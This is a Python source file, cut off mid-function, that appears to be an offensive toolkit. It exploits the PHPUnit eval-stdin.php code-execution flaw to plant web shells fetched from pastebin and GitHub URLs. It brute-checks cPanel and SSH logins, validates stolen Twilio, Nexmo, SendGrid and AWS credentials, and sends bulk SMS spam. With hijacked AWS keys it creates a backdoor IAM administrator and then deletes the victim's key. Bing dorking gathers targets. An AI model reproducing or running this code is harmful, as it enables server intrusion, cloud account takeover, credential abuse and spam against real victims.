from multiprocessing.dummy import Pool
import warnings,random,socket,threading
from re import findall as reg
import requests, re, sys, os
from colorama import Fore, Style, Back
import paramiko
from colorama import init
from time import time as timer  
import subprocess
import time
import hashlib
import datetime
import ipaddress
from multiprocessing.dummy import Pool
import smtplib
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gaierror
from twilio.rest import Client
import boto3
import random
init()

Targetssaaa = "sendto.ini" #for date
fsetting = open(Targetssaaa, 'r').read()
path = "path.ini" #for date
pathop = open(path, 'r')
pathline = pathop.read().split('\n')
lock = threading.Lock()

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    WHITE = '\033[0m'
    red = Fore.RED

chars = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","/","/"]
charssg = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","-","_"]
region = 0

Headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }

def slowprint(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(1./10)

def aws_id():
    output = 'AKIA'
    for i in range(16):
        output += random.choice(chars[0:38]).upper()
    return output

def aws_key():
    output = ''
    for i in range(40):
        if i == 0 or i == 39:
            ranUpper = random.choice(chars[0:38]).upper()
            output += random.choice([ranUpper, random.choice(chars[0:38])])
        else:
            ranUpper = random.choice(chars[0:38]).upper()
            output += random.choice([ranUpper, random.choice(chars)])
    return output

def sg_key():
    output = 'SG.'
    for i in range(22):
        ranUpper = random.choice(charssg[0:38]).upper()
        output += random.choice([ranUpper, random.choice(charssg[0:38])])
    output += '.'
    for i in range(43):
      ranUpper = random.choice(charssg[0:38]).upper()
      output += random.choice([ranUpper, random.choice(charssg[0:38])])
    return output

def print_key_aws(region):
    print("GENERATE..")
    print("aws_access_key_id=" + aws_id())
    print("aws_secret_access_key=" + aws_key())
    save = open('Result/key_generator/aws.txt', 'a')
    save.write(aws_id()+'|'+aws_key()+'|'+str(region)+'\n')

def print_key_sendgrid():
    print("GENERATE..")
    print("key = " + sg_key())
    save = open('Result/key_generator/sendgrid.txt', 'a')
    save.write(sg_key()+'\n')
    save.close()

def twillio_sender():
    try:
        a = input("input your Account SID : ")
        t = input("input your Auth Key : ")
        phonelist = input("input your phone list : ")
        list = open(phonelist, 'r')
        lista = list.read().split('\n')
        nopetest = '+212701906675'
        
        time.sleep(1)
        print("[+] Checking ....")
        time.sleep(1)
        date = datetime.datetime.now().strftime('%Y-%m-%d')
        balance = get_balance(a,t)
        number = get_phone(a,t)
        type = get_type(a,t)
        bod ='test'
        send = send_sms(a,t,bod,number,nopetest)
        if send == 'die':
            status = 'CANT SEND SMS'
        else:
            status = 'LIVE'
        print ("------------------------------------------------")
        print ("[+] STATUS : {}".format(str(status)))
        print ("[+] Account SID : {}".format(str(a)))
        print ("[+] Auth Key :  {}".format(str(t)))
        print ("[+] Balance :  {}".format(str(balance)))
        print ("[+] Phone Number list : {}".format(str(number)))
        print ("[+] Account Type : {}".format(str(type)))
        print ("------------------------------------------------")
        open('Result/twillio_sender/twilio_result_check.txt','a').write("[+] STATUS : {}\n[+] Account SID : {}\n[+] Auth Key : {}\n[+] Balance : {}\n[+] Phone number list : {}\n[+] Account Type : {} \n\n".format(str(status),str(a),str(t),str(balance),str(number),str(type)))
        
        bod = input(" [+] enter the message : ")
        if "LIVE" in str(status):
            for i in lista:
                try:
                    if '+1' not in i:
                        nope = '+1'+i
                    else:
                        nope = i
                except:
                    continue
                send = send_sms(a,t,bod,number,str(nope))
                if send == 'die':
                    print(bcolors.FAIL+"Failed Send  => "+str(nope)+" | Balance : "+str(get_balance(a,t)))
                    open('Result/twillio_sender/fail_send.txt','a').write(nope+'\n')
                else:
                    print(bcolors.OKGREEN+"Success Send => "+str(nope)+" | Balance : "+str(get_balance(a,t)))
                    open('Result/twillio_sender/success_send.txt','a').write(nope+'\n')
                time.sleep(1)
    except:
        print("INVALID KEY")

def exploit(url):
  try:
    data = "<?php phpinfo(); ?>"
    text = requests.get(url, data=data, timeout=1, verify=False)
    urls = url.replace("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","")
    if "phpinfo()" in text.text:
      data2 = "<?php eval('?>'.base64_decode('PD9waHAgPz48P3BocApmdW5jdGlvbiBhZG1pbmVyKCR1cmwsICRpc2kpIHsKICAgICRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7CiAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwpOwogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0JJTkFSWVRSQU5TRkVSLCB0cnVlKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgdHJ1ZSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfU1NMX1ZFUklGWVBFRVIsIGZhbHNlKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOwogICAgcmV0dXJuIGN1cmxfZXhlYygkY2gpOwogICAgY3VybF9jbG9zZSgkY2gpOwogICAgZmNsb3NlKCRmcCk7CiAgICBvYl9mbHVzaCgpOwogICAgZmx1c2goKTsKfQppZiAoYWRtaW5lcigiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1pLZlhTdUJYIiwgImRldi5waHAiKSkgewogICAgZWNobyAiU3Vrc2VzIjsKfSBlbHNlIHsKICAgIGVjaG8gImZhaWwiOwp9Cj8+')); ?>"
      spawn = requests.get(url, data=data2, timeout=1, verify=False)
      if "Sukses" in spawn.text:
        print("[SHELL INFO] "+urls+" | \033[32;1mSHELL SUCCESS\033[0m")
        buildwrite = url.replace("eval-stdin.php","dev.php")+"\n"
        shellresult = open("Result/phpunit_shell_1.txt","a")
        shellresult.write(buildwrite)
        shellresult.close()
      else:
        print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"FAILED\033[0m")
    else:
      print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
  except:
    print("[SHELL INFO] TRY METHOD 2..")
    try:
      koc = tod.get(urls + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", verify=False, timeout=1)
      if koc.status_code == 200:
        peylod = "<?php echo 'Con7ext#'.system('uname -a').'#'; ?>"
        peylod2 = "<?php echo 'ajg'.system('wget https://raw.githubusercontent.com/rintod/toolol/master/payload.php -O c.php'); ?>"
        ree = tod.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod, verify=False)
        if 'Con7ext' in ree.text:
          bo = tod.post(site + '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', data=peylod2, verify=False)
          cok = tod.get(site +"/vendor/phpunit/phpunit/src/Util/PHP/c.php", verify=False)
          if cok.status_code == 200 and '>>' in cok.text:
            print("[SHELL INFO] "+urls+" | \033[32;1mSHELL SUCCESS\033[0m")
            shellresult = open("Result/phpunit_shell_2.txt","a")
            shellresult.write(site+"/vendor/phpunit/phpunit/src/Util/PHP/c.php")
            shellresult.close()
          else:
            print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
        else:
          print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
      else:
        print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")
    except:
      print("[SHELL INFO] "+urls+" | "+bcolors.FAIL+"BAD\033[0m")



def get_balance(a,t):
    r = requests.get('https://api.twilio.com/2010-04-01/Accounts/'+a+'/Balance.json', auth=(a,t))
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    balance = resp ['balance']
    currency = resp ['currency']
    return str(balance)+' '+str(currency)

def get_phone(a,t):
    client = Client(a,t)
    incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
    for record in incoming_phone_numbers:
        return record.phone_number

def get_type(a,t):
    client = Client(a,t)
    account = client.api.accounts.create()  
    return account.type

def send_sms(a,t,bod,phone,tos):
    try:
        client = Client(a,t)
        message = client.messages.create(
                                    body=str(bod),
                                    from_= phone,
                                    to=tos
                                )
        return message.status
    except:
        return 'die' 

def checkcpanel(url,user,paswd):
        try:
            req = requests.get(url + "/cpanel", verify=False)
            if req.status_code == 200 and "<a href=\"https://go.cpanel.net/privacy\"" in req.text:
              url = url.split("/")
              datas = {
                  "user": user,
                  "pass": paswd,
                  "goto": "/"
              }
              req = requests.post(url[0] + "//" + url[2] + ":2082/login/?login_only=1", data=datas, verify=False)
              if "redirect" in req.text and "security_token" in req.text:
                  cpanel = url + "|" + user + "|" + paswd
                  sukses = open("Result/cpanel_crack.txt", "a")
                  sukses.write(cpanel)
                  sukses.close()        
        except Exception as e:
            print("CPANEL ERROR!" + str(e))

        try:
          bross = url.split("/")
          ip = socket.gethostbyname(bross[2])
          ssh = paramiko.SSHClient()
          ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
          ssh.connect(ip, port=22, username=self.user, password=self.paswd, timeout=4)
          cpanel2 = ip + "|" + user + "|" + paswd
          sukses = open("Result/ssh_crack.txt", "a")
          sukses.write(cpanel2)
          sukses.close()  
        except (paramiko.ssh_exception.AuthenticationException, Exception):
          print("SSH ERROR!" + str(e))
    
def sendgridcheck(sapi):
  sukses = open("Result/sendgrid_checker/success.txt", "a")
  gagal = open("Result/sendgrid_checker/fail.txt", "a")
  try:
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0','Authorization': 'Bearer '+sapi}
    NexmoGetBalance = requests.get('https://api.sendgrid.com/v3/user/credits',headers=headers)
    Limit = json.loads(NexmoGetBalance.text)["total"]
    Used = json.loads(NexmoGetBalance.text)["used"]
    SendgridMf = requests.get('https://api.sendgrid.com/v3/user/email',headers=headers)
    Mf = json.loads(SendgridMf.text)['email']
    print('user      : apikey')
    print('limit      :', Limit)
    print('used      :', Used)
    print('Mail from      :\n', Mf)
    sukses.write('user    : apikey'"\n"'stripkey    : '+sapi+"\nStatus    : %s\n" % Limit)
    sukses.write("used    : %s\n" % Used)
    sukses.write("mailfrom    : %s\n" % Mf)
    sukses.write("---------------------------------------------------------------------------\n")
    sukses.close()
  except:
    print(sapi+": Get data failed")
    gagal.write(sapi+" -> Failed Get Data\n")

def awslimitcheck(ACCESS_KEY,SECRET_KEY,REGION):
    try:
      email = ACCESS_KEY
      password = SECRET_KEY
      region = REGION
      client = boto3.client(
			'ses'
			,aws_access_key_id=email
			,aws_secret_access_key=password
			,region_name = region)
      data = "[O][ACCOUNT]{}|{}|{}".format(email,password,region)
      with lock:
        print("\033[1m"  +  "\033[94m" + data)
      response = client.get_send_quota()
      with lock:
        print(" \033[92m[Account Active]")
      limit =  f"Max Send email 24 Hours: {response['Max24HourSend']} "
      ddd = client.list_verified_email_addresses(
			)

			#[Account Active]                           {'VerifiedEmailAddresses': ['HiveHelpdesk@btistudios.com', 'NoReply.HiveHD@btistudios.com', 'Alerts.HiveHD@btistudios.com', 'NoReply.VendorBTI@btistudios.com'], 'ResponseMetadata': {'RequestId': '7c39c498-5d7d-43de-a437-227541468580', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '7c39c498-5d7d-43de-a437-227541468580', 'content-type': 'text/xml', 'content-length': '577', 'date': 'Sun, 25 Oct 2020 09:35:03 GMT'}, 'RetryAttempts': 0}}
      getEmailListVer = f"Email Verification from mail:{ddd['VerifiedEmailAddresses']}"
      with lock:
        print(getEmailListVer)
      response = client.list_identities(
			IdentityType='EmailAddress',
			MaxItems=123,
			NextToken='',
			)
      listemail = f"Email: {response['Identities']}"
      with lock:
        print(listemail)
			#{'Identities': ['HiveHelpdesk@btistudios.com', 'NoReply.HiveHD@btistudios.com', 'Alerts.HiveHD@btistudios.com', 'NoReply.VendorBTI@btistudios.com'], 'ResponseMetadata': {'RequestId': '4448b8b8-3fe8-4644-bcf4-d13b9ec5fa8a', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '4448b8b8-3fe8-4644-bcf4-d13b9ec5fa8a', 'content-type': 'text/xml', 'content-length': '505', 'date': 'Fri, 23 Oct 2020 16:00:40 GMT'}, 'RetryAttempts': 0}}
			#print(response)
      statistic = client.get_send_statistics()
      getStatistic = f"Email Sent Today Ini:{statistic['SendDataPoints']}"
      with lock:
        print(getStatistic)
        print("All Data")
      xxx = email+"|"+password+"|"+region + "|" +  limit +"|" + listemail
      with lock:
        print(xxx)
      remover = str(xxx).replace('\r', '')
      simpan = open('Success_Check_aws_key_limit.txt', 'a')
      simpan.write(remover+'\n\n')
      simpan.close()
      with lock:
        print("Total SimpValid: " + totz)
      response = client.list_users(
			)
      print(response)
			
			#{'Max24HourSend': 200.0, 'MaxSendRate': 1.0, 'SentLast24Hours': 0.0, 'ResponseMetadata': {'RequestId': '640d0a86-6b5f-4965-b7fc-5127a820258a', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '640d0a86-6b5f-4965-b7fc-5127a820258a', 'content-type': 'text/xml', 'content-length': '369', 'date': 'Fri, 23 Oct 2020 05:43:42 GMT'}, 'RetryAttempts': 0}}
			#print ("berhasil login")			
    except:
      print("\033[91m[Account DIE] | region => "+REGION)
      pass

def nexmosend(url,a,s):
    r = requests.get('https://rest.nexmo.com/sms/json?api_key='+str(a)+'&api_secret='+str(s)+'&to=+212701906675&text=test&from=TEST')
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    test = resp['messages']
    try:
        balance = test[0]["remaining-balance"]
    except:
        balance = "Error"
    try:
        errorcode = test[0]["error-text"]
    except:
        errorcode = "UNKNOWN"

    if "Quota Exceeded - rejected" in errorcode:
        print(bcolors.WARNING+str(a)+" => "+bcolors.OKBLUE+"Quota Exceeded - rejected | Balance : "+str(balance))
    elif "Bad Credentials" in errorcode:
        print(bcolors.WARNING+str(a)+" => "+bcolors.FAIL+"Bad Credentials")
    elif "Error" not in balance:
        print(bcolors.WARNING+str(a)+" => "+bcolors.OKGREEN+"Valid | Balance : "+str(balance))
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()
    else:
        print(bcolors.WARNING+str(a)+" => Cant Send to US | error code: "+str(errorcode))
        build = 'API_KEY : '+str(a)+'\nAPI_SECRET : '+str(s)+'\nBALANCE : '+str(balance)+'ERROR : '+str(errorcode)+'\n\n'
        save = open('Result/valid_nexmo.txt', 'a') 
        save.write(build)
        save.close()


def twilliocheck(url,acc_sid,acc_key,acc_from):
  account_sid = acc_sid
  auth_token = acc_key
  client = Client(account_sid, auth_token)
  account = client.api.accounts.create()
  
  if "Unable to create record: Authenticate" not in account.sid:
    print("TWILLIO VALID SEND API")
    balance = get_balance(acc_sid,acc_key)
    number = get_phone(acc_sid,acc_key)
    type = get_type(acc_sid,acc_key)
    bod ='test'
    nopetest = '+14303052705'
    send = send_sms(acc_sid,acc_key,bod,number,nopetest)
    if send == 'die':
        status = 'CANT SEND SMS TO US'
    else:
        status = 'LIVE'
    
    save = open('Result/valid_twillio.txt', 'a')
    build = 'URL: '+str(url)+'\nSTATUS : '+format(str(status))+'\nAccount SID : '+str(acc_sid)+'\nAuth Key: '+str(acc_key)+'\nBalance : '+format(str(balance))+'\nFROM: '+format(str(number))+'\nAccount Type : '+format(str(type))+'\n\n------------------------------------------------\n'
    save.write(build)
    save.close()
    
def autocreate(ACCESS_KEY,SECRET_KEY,REGION):
    try:
        UsernameLogin = "jSDSsajsnhjjjjjjwyyw"
        user = ACCESS_KEY
        keyacces = SECRET_KEY
        regionz = REGION
        client = boto3.client(
        'iam'
        ,aws_access_key_id=user
        ,aws_secret_access_key=keyacces
        ,region_name = regionz)
        data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
        with lock:
          print(data)
        Create_user = client.create_user(
        UserName=UsernameLogin,
        )
        with lock:
          print("succes create iam lets go to dashboard!")
        bitcg = f"User: {Create_user['User'] ['UserName']}"
        xxxxcc = f"User: {Create_user['User'] ['Arn']}"
        
        with lock:
          print(bitcg)
        with lock:
          print(xxxxcc)
        
        #keluan 'Arn': 'arn:aws:iam::320406895696:user/Kontolz'
        #debug mode create
        with lock:
          print(Create_user)
        #set konstanta pws 
        pws = "admajsd21334#1ejeg2shehhe"
        with lock:
          print("Username = " + UsernameLogin)
          print("create acces login for" + UsernameLogin)
        Buat = client.create_login_profile(
        Password=pws,
        PasswordResetRequired=False,
        UserName=UsernameLogin
        )
        with lock:
          print(Buat)
        
        #'LoginProfile': {'UserName': 'Kontolz', 'CreateDate':
        with lock:
          print("password:" + pws)
        with lock:
          print("give access  User to Admin")
        Admin = client.attach_user_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        UserName=UsernameLogin,
        )
        xxx = UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
        with lock:
          print(xxx)
        remover = str(xxx).replace('\r', '')
        with lock:
          print("Success crack.. save in imaccount.txt")
        simpan = open('Result/IamAccount.txt', 'a')
        simpan.write(remover+'\n\n')
        simpan.close()
        with lock:
          print(Admin)
        response = client.delete_access_key(
          AccessKeyId=user
        )
        with lock:
          print(response)
        with lock:
          print("succesful your key is privat only now !")
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.OKGREEN+"Success Create User")
    except Exception as e:
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.FAIL+"Failed Create User")
        pass

def autocreateses(url,ACCESS_KEY,SECRET_KEY,REGION):
    try:
        UsernameLogin = "jSDSsajsnhjjjjjjwyyw"
        user = ACCESS_KEY
        keyacces = SECRET_KEY
        regionz = REGION
        client = boto3.client(
        'iam'
        ,aws_access_key_id=user
        ,aws_secret_access_key=keyacces
        ,region_name = regionz)
        data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
        with lock:
          print(data)
        Create_user = client.create_user(
        UserName=UsernameLogin,
        )
        with lock:
          print("succes create iam lets go to dashboard!")
        bitcg = f"User: {Create_user['User'] ['UserName']}"
        xxxxcc = f"User: {Create_user['User'] ['Arn']}"
        
        with lock:
          print(bitcg)
        with lock:
          print(xxxxcc)
        
        #keluan 'Arn': 'arn:aws:iam::320406895696:user/Kontolz'
        #debug mode create
        with lock:
          print(Create_user)
        #set konstanta pws 
        pws = "admajsd21334#1ejeg2shehhe"
        with lock:
          print("Username = " + UsernameLogin)
          print("create acces login for" + UsernameLogin)
        Buat = client.create_login_profile(
        Password=pws,
        PasswordResetRequired=False,
        UserName=UsernameLogin
        )
        with lock:
          print(Buat)
        
        #'LoginProfile': {'UserName': 'Kontolz', 'CreateDate':
        with lock:
          print("password:" + pws)
        with lock:
          print("give access  User to Admin")
        Admin = client.attach_user_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        UserName=UsernameLogin,
        )
        xxx = url+"|"+UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
        with lock:
          print(xxx)
        remover = str(xxx).replace('\r', '')
        with lock:
          print("Success crack.. save in imaccount.txt")
        simpan = open('Result/IamAccount.txt', 'a')
        simpan.write(remover+'\n\n')
        simpan.close()
        with lock:
          print(Admin)
        response = client.delete_access_key(
          AccessKeyId=user
        )
        with lock:
          print(response)
        with lock:
          print("succesful your key is privat only now !")
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.OKGREEN+"Success Create User")
    except Exception as e:
        with lock:
          print(bcolors.WHITE+ACCESS_KEY+" ==> "+bcolors.FAIL+"Failed Create User")
        pass

class dorker(object):

    def __init__(self,dork,pages,proxy):
        self.dork = dork
        self.page_ammount = pages
        self.domains_bing = []
        self.proxy_required = proxy
        self.first_page_links = []


    def filter_and_adding(self,domains_list):
        alert_string = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'INFO' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(alert_string+"-> Checking Smtp ..")
        print()
        data = open('blacklist/sites.txt').readlines()
        new_data = [items.rstrip() for items in data]
        for domains in domains_list:
            domain_data = domains.split('/')
            new_domain = domain_data[0]+"//"+domain_data[2]+'/'
            if new_domain not in new_data:
                self.domains_bing.append(new_domain)
                jembotngw2(new_domain)
                print(new_domain,file=open('result/sitesgrab.txt', 'a'))



    def first_page(self):
        try:
            url = "https://www.bing.com/search?q=" + self.dork + "&first=" + '1' + "&FORM=PERE"
            header = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }
            source_code = requests.get(url, headers=header).text
            keyword = '<li class="b_algo"><h2><a href="'
            split_data = source_code.split(keyword)
            for x in range(10):
                links_ = split_data[x + 1].split('"')[0]
                self.first_page_links.append(links_)
        except IndexError:
            pass

    def searcher(self):
        for i in range(self.page_ammount):
            url = "https://www.bing.com/search?q=" + self.dork +"&first=" + str(i)+'1' + "&FORM=PERE"
            info_string_box = Fore.LIGHTCYAN_EX+'['+Fore.LIGHTBLUE_EX+'-'+Fore.LIGHTCYAN_EX+']'+Fore.WHITE
            added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + '+' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE

            print(info_string_box+f" Printing Page  {i}")
            print()
            header = {
                'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
            }
            try:
                source_code = requests.get(url,headers=header).text
                keyword = '<li class="b_algo"><h2><a href="'
                split_data = source_code.split(keyword)
                temporary_domain_list = []
                try:
                    for x in range(10):
                        links_ = split_data[x+1].split('"')[0]
                        temporary_domain_list.append(links_)
                        print(added_sting+" - "+links_)

                except IndexError:
                    pass

                print()
                print('--------')
                self.filter_and_adding(temporary_domain_list)


            except requests.exceptions.HTTPError:
                print("Http error retrying")
                continue
            except requests.exceptions.ConnectTimeout:
                print("Connection timed out error retrying")
                continue
            except requests.exceptions.Timeout:
                print("Timeout error retrying")
                continue

            if i != 0:
                if self.first_page_links == temporary_domain_list:
                    print("Same Urls Found Again. Last Resulsts Reached | Removing Dublicates.")
                    break

    def start(self):

        self.first_page()
        self.searcher()

        print(f"Done Total sites scrapped {len(self.domains_bing)}")


proxy_error = 0
sites_list = []

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

init(convert=True)

class settings:
	y = Fore.YELLOW
	r = Fore.RED
	b = Fore.BLUE

def ip_grabber(site,sites_length,current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTBLUE_EX + 'SITE' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'IP' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(info_string_box + f': {site} - ' + added_sting + f': {ip}')
        oother = open('result/websitetoip.txt', "a")
        oother.write(ip+"\n")
        oother.close()
    except socket.gaierror:
        pass

def ip_grabberautoscan(site,sites_length,current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTBLUE_EX + 'SITE' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'IP' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(info_string_box + f': {site} - ' + added_sting + f': {ip}')
        dorkscan(ip)
        oother = open('result/websitetoip.txt', "a")
        oother.write(ip+"\n")
        oother.close()
    except socket.gaierror:
        pass

def clean():
  lines_seen = set()
  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  outfile = open('rd-'+Targetssa, "a")
  infile = open(Targetssa, "r")
  for line in infile:
    if line not in lines_seen:
      outfile.write(line)
      lines_seen.add(line)
  outfile.close()
  infile.close()
  print("Duplicate removed successfully!")
  print("saved as rd-"+str(Targetssa))
  print("Load Menu On 1 sec")
  print("-------------------------------")
  time.sleep(1)
  cinxx()

def autodork():
  dork = input("Dork/Keyword [not a file but type directly]: ")
  print()
  print("""
      select your country, all for global | for country search in,de,fr type directly without .
  """)
  print()
  country = input("Country: ")
  if country == 'all':
      dork_new = dork
  else:
      dork_new = dork+' site:'+country
  # Perform anti public actions here
  pages_ = input("Pages [Note: Bing may have limited results]: ")
  dorker(dork_new,int(pages_),False).start()

binglist = {"http://www.bing.com/search?q=&count=50&first=1",
"http://www.bing.com/search?q=&count=50&first=51",
"http://www.bing.com/search?q=&count=50&first=101",
"http://www.bing.com/search?q=&count=50&first=151",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com/search?q=&count=50&first=251",
"http://www.bing.com/search?q=&count=50&first=301",
"http://www.bing.com/search?q=&count=50&first=351",
"http://www.bing.com/search?q=&count=50&first=401",
"http://www.bing.com/search?q=&count=50&first=451",
"http://www.bing.com/search?q=&count=50&first=501",
"http://www.bing.com/search?q=&count=50&first=551",
"http://www.bing.com/search?q=&count=50&first=601",
"http://www.bing.com/search?q=&count=50&first=651",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.com/search?q=&count=50&first=201",
"http://www.bing.vn/search?q=&count=50&first=101"}

def dorkscan(dork):
  jembotngw2(dork)
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print("START REVERSE FROM IP => "+dork)
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          jembotngw2(site)
        except:
            pass
    except:
      pass

def dorkscansave(dork):
  jembotngwsave(dork)
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print("START REVERSE FROM IP => "+dork)
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          jembotngwsave(site)
        except:
            pass
    except:
      pass

def reverseip(dork):
  ori = dork
  if "ip" not in dork:
    dork = " ip:\""+dork+"\" "
  print("START REVERSE FROM IP => "+ori)
  for bing in binglist:
    bingg = bing.replace("&count",dork+"&count")
    try:
      r = requests.get(bingg)
      checktext = r.text
      checktext = checktext.replace("<strong>","")
      checktext = checktext.replace("</strong>","")
      checktext = checktext.replace('<span dir="ltr">','')
      checksites = re.findall('<cite>(.*?)</cite>',checktext)
      for sites in checksites:
        sites = sites.replace("http://","protocol1")
        sites = sites.replace("https://","protocol2")
        sites = sites + "/"
        site = sites[:sites.find("/")+0]
        site = site.replace("protocol1","http://")
        site = site.replace("protocol2","https://")
        try:
          print("[+] "+ori+" => "+site)
          live = open('Result/result_reverseip.txt', 'a')
          live.write(str(site)+ '\n')
          live.close()
        except:
          pass
    except:
      pass

def sparkpostmail():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sparkpostmail=on" in ip_listx:
    sparkpostmail = "on"
    return sparkpostmail
  else:
    sparkpostmail = "off"
    return sparkpostmail
def and1():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "and1=on" in ip_listx:
    and1 = "on"
    return and1
  else:
    and1 = "off"
    return and1
def zimbra():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zimbra=on" in ip_listx:
    zimbra = "on"
    return zimbra
  else:
    zimbra = "off"
    return zimbra

def relay():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "gsuite-relay=on" in ip_listx:
    relay = "on"
    return relay
  else:
    relay = "off"
    return relay

def sendinblue():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "sendinblue=on" in ip_listx:
    sendinblue = "on"
    return sendinblue
  else:
    sendinblue = "off"
    return sendinblue

def mandrillapp():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "mandrillapp=on" in ip_listx:
    mandrillapp = "on"
    return mandrillapp
  else:
    mandrillapp = "off"
    return mandrillapp

def zoho():

  Targetssaaa = "settings.ini" #for date
  ip_listx = open(Targetssaaa, 'r').read()

  if "zoho=on" in ip_listx:
